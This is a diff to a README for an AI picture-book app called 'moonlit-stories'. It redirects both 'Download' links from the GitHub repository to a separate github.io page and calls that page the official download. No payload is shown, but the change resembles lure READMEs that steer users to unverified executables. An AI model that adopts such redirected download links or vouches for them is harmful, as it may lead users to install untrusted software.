@@ -1,6 +1,6 @@
 # 🌙 moonlit-stories - Create Beautiful AI Picture Books Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-moonlit--stories-ff69b4?style=for-the-badge&logo=github)](https://github.com/longbodied-federation556/moonlit-stories)
+[![Download Now](https://img.shields.io/badge/Download-moonlit--stories-ff69b4?style=for-the-badge&logo=github)](https://longbodied-federation556.github.io)
 
 ---
 
@@ -29,7 +29,7 @@ Follow these simple steps to start creating your very first picture book today. 
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[Download moonlit-stories](https://github.com/longbodied-federation556/moonlit-stories)**
+Visit this link to download the application: **[Download moonlit-stories](https://longbodied-federation556.github.io)**
 
 This will take you to the official download page. Look for the big download button and click it. The file will start downloading to your computer automatically.
 
